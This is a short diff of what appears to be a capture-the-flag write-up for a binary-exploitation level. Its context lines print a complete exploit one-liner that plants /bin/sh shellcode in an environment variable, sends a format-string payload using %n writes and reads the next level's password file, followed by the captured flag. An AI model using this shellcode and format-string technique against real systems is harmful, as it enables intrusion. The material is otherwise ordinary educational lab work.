@@ -98,4 +98,4 @@ b:  68 2f 62 69 6e          	push   0x6e69622f
 echo $(echo $(unset $(env | cut -d= -f1); export f=$(/usr/bin/printf '\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80'); (/usr/bin/python -c "print('\xff\xff\xdd\x5c'[::-1] + 'A'*4 + '\xff\xff\xdd\x5d'[::-1] + 'A'*4 + '\xff\xff\xdd\x5e'[::-1] + '\xff\xff\xdd\x5f'[::-1] + '%9.x'*8+'%69.c' + '%n' + '%58.c' + '%n' + '%32.c' + '%n' + '%n')"; /bin/echo '/bin/cat /home/users/level06/.pass') | /home/users/level05/level05))
 ```
 
-**Flag :** h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+#### Flag: `h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq`
